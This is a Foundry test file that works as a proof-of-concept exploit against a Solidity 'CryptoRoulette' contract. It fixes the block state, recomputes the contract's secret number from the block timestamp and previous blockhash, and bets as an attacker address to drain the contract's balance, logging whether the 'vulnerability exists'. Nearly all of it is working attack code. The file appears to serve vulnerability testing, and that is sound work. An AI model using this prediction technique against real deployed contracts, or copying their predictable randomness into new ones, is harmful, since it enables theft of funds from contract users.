// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/crypto_roulette.sol";

contract CryptoRouletteTest is Test {
    CryptoRoulette roulette;
    address attacker = address(0xBAD);

    function setUp() public {
        // Set predictable block environment
        uint256 startBlock = 10;
        uint256 startTimestamp = 1000;
        
        // Initialize block state
        vm.roll(startBlock);
        vm.warp(startTimestamp);
        
        // Deploy contract
        roulette = new CryptoRoulette();
        
        // Fund contracts for testing
        vm.deal(address(roulette), 1 ether);
        vm.deal(attacker, 1 ether);
    }

    function test_secretNumberPrediction() public {
        // Predict the deployed contract's initial secret number
        uint8 predictedSecret = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp, 
                        blockhash(block.number - 1)
                    )
                )
            ) % 20 + 1
        );

        if (predictedSecret > 10) {
            console.log("Skipping test: Secret exceeds betting range");
            console.log("Vulnerability not Exist: Skipped due to invalid secret number prediction");
            return;
        }

        console.log("--- BEFORE-Trigger Balances ---");
        uint256 contractBalanceBefore = address(roulette).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);
        uint256 betPrice = roulette.betPrice();
        uint256 expectedAfterAttack = attackerBalanceBefore - betPrice + contractBalanceBefore;

        console.log("--- Trigger Attack ---");
        vm.prank(attacker);
        roulette.play{value: betPrice}(predictedSecret);

        console.log("--- AFTER-Trigger Balances ---");
        uint256 contractBalanceAfter = address(roulette).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);

        if (contractBalanceAfter == 0 && attackerBalanceAfter == expectedAfterAttack) {
            console.log("DIFFERENTIAL VERDICT: Balances changed - Contract drained & attacker won funds");
            console.log("Vulnerability Exists: Secret number was correctly predicted and contract funds were stolen");
        } else {
            console.log("DIFFERENTIAL VERDICT: Balances unchanged - Attack failed to exploit vulnerability");
            console.log("Vulnerability not Exist: Attack failed to steal contract funds");
        }
    }
}